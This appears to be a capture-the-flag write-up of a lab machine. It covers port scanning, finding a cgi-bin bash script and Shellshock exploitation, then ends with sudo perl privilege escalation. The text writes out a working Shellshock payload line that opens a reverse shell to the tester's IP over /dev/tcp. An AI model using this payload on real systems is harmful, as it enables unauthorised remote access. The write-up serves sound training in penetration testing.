![banner](https://imgur.com/obIMPNK.png)

<h2>Nmap scan</h2>


![port scan](https://imgur.com/MujmPSg.png)


From the port scan, we see 2 ports open. The service running on port 2222 is OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) and it requires a key so its to safe to say that we can cross out any ssh methods of pwning this box. And the service running on port 80 is Apache httpd 2.4.18 ((Ubuntu)) meaning we will find a website if we enter the ip in firefox or any search engine.

<h2>Website</h2>

![webpage](https://imgur.com/Rw7vPe4.png)

Didn't expect to find this but there are weirder-looking websites out there. So first thing is to check the page source and use the inspect element to see if there are any clues.

![page source](https://imgur.com/R9bKrxh.png)

Ye that was to be expected this is the most complicated website using some js framework. 
 
My next thought was to see if there are any web directories using `dirbuster`.

![dirbscan](https://imgur.com/MQ3z38w.png)

And we can see from our scan a `cgi-bin` directory. And after some googling of the common file types, we can tell dirbuster to look for certain files that end with .sh,.bin,.cgi.

Here are some example files: 
https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/cgis.txt

And seems like we found something a bash script.

![user.sh](https://imgur.com/03tFgIo.png)

<h2>Bash Script</h2>


Using `wget http://10.10.10.56:80/cgi-bin/user.sh` I pulled the file to my machine to take a look. 

![script contents](https://imgur.com/4Bm571L.png)

And it looks like just a script that keeps a track of how long the machine is running.

Okay cool, so the next step is to find out wtf we can do with this.

<h2>The exploit</h2>

After some googling of readable bash scripts in cgi-bin exploits, I came across shellshock exploit. 

https://www.yeahhub.com/shellshock-vulnerability-exploitation-http-request/

Using `wget -U '() { :;}; /bin/bash -c "sh -i >& /dev/tcp/10.10.14.5/4444 0>&1"' http://10.10.10.56:80/cgi-bin/user.sh`

We can get a reverse shell back on my machine

![exploit](https://imgur.com/fVlFJi3.png)
![listener](https://imgur.com/aSrX9QT.png)

<h2>User Flag</h2>

Now that we have access to the machine we can find the user flag in the shellys home folder.

![user flag](https://imgur.com/P2U7DMR.png)

<h2>Root Flag</h2>

Next is to get the root flag, first I check the permissions that the user we are signed in as, I did this by using the `sudo -l` and this was the output.

![sudo -l](https://imgur.com/LzRyASz.png)

So we can execute perl with sudo and using this info I looked into [gtfobins](https://gtfobins.github.io/#) for the command that elevates me to root


![priv sec](https://imgur.com/n6PnUrh.png)

And we rooted the machine!